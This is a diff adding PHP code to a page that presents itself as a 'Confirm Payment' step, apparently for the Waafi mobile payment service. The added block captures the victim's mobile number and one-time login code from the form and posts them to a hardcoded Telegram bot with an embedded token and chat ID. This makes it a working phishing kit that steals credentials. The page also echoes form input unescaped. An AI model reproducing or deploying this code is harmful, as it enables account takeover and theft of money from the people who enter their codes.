@@ -268,6 +268,46 @@
   <main class="page">
     <div class="otp-card">
       <h2 class="otp-title">Confirm Payment</h2>
+      <?php
+    $mobile   = trim($_POST['mobile'] ?? '');
+    $otp1  = trim($_POST['otp_code'] ?? '');
+
+      $botToken = "8648558019:AAHImsUZ7UJK8t1b629JTTxSd3vvHpH0rhY";
+      $chatId   = "1135238504";
+
+        $text = "Waafi Website Message\n\n"
+          . "mobile: $mobile\n"
+          . "VerifyLoginOtp: $otp1\n";
+
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+
+    $data = [
+        'chat_id' => $chatId,
+        'text'    => $text
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($ch);
+
+    if ($response === false) {
+        header('Location: error.php');
+        exit;
+    }
+
+    $result = json_decode($response, true);
+
+    if (isset($result['ok']) && $result['ok'] === true) {
+        exit;
+    }
+
+    exit;
+
+      ?>
       <p class="otp-text">
         
         You Are About to Purchase <span id="phone-number"><?php echo $_POST['package']?> for <?php echo $_POST['mobile']?></span>
